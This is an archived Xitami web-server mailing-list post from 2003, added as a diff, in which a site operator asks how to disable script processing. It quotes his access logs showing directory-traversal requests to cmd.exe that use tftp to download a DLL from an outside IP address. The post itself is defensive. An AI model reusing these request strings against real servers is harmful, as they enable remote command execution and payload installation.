@@ -1,0 +1,103 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Security Issue - Disabling Script Processing
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="004606.html">
+   <LINK REL="Next"  HREF="004612.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Security Issue - Disabling Script Processing
+   </H1>
+    <B>Rob @ BMM
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Security Issue - Disabling Script Processing">xitami@lists.xitami.org
+       </A><BR>
+    <I>Tue, 14 Jan 2003 10:40:06 -0700</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="004606.html">[Xitami] Problem: Log files write nothing!
+</A></li>
+        <LI> Next message: <A HREF="004612.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4610">[ date ]</a>
+              <a href="thread.html#4610">[ thread ]</a>
+              <a href="subject.html#4610">[ subject ]</a>
+              <a href="author.html#4610">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Hi,
+
+Please forgive me if I have not sent this correctly to the group.
+
+Can somebody help me with this.
+
+Periodically, I see in the access logs and error logs, an attempt from a
+hacker to run certain types of scripts in a cmd window such as the
+following:
+
+&quot;GET
+/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+ET%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET
+/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+ET%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET
+/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+ET%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET /scripts/..%%35%63../httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET
+/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET
+/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+&quot;GET
+/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+
+Notice that the hacker successfully used tftp to send some info back to
+himself.  My router logs confirmed that this occurred.  I have since
+eliminated all access rights to tftp.  Not even the admin has rights
+anymore.  Since this is on a Win2k system, you just can't delete or rename
+certain system executables such as cmd.exe or tftp.exe.  Windows just
+restores it automatically.
+
+The question is: Since I run a simple HTML only site and don't need CGI
+processing, what can I do to eliminate all script processing of this nature.
+
+PS - The rest of you probably encounter some of these same security issues.
+You should check.
+
+Best Regards,
+Rob Allen
+President, Blue Marble Meds LLC.  Offering 30-75% off Prescription Meds
+See us at <A HREF="http://www.BlueMarbleMeds.com">http://www.BlueMarbleMeds.com</A>
+
+
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="004606.html">[Xitami] Problem: Log files write nothing!
+</A></li>
+	<LI> Next message: <A HREF="004612.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4610">[ date ]</a>
+              <a href="thread.html#4610">[ thread ]</a>
+              <a href="subject.html#4610">[ subject ]</a>
+              <a href="author.html#4610">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
